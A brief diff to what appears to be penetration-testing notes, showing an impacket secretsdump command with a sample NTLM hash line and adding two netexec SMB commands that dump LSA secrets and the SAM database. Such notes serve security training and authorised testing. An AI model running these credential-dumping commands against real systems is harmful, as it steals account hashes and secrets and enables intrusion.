@@ -22,3 +22,5 @@ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -securi
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    User       RID            LMHASH                            NTLMHASH
 
+netexec smb <IP> --local-auth -u <USER> -p <PASS> --lsa
+netexec smb <IP> --local-auth -u <USER> -p <PASS> --sam
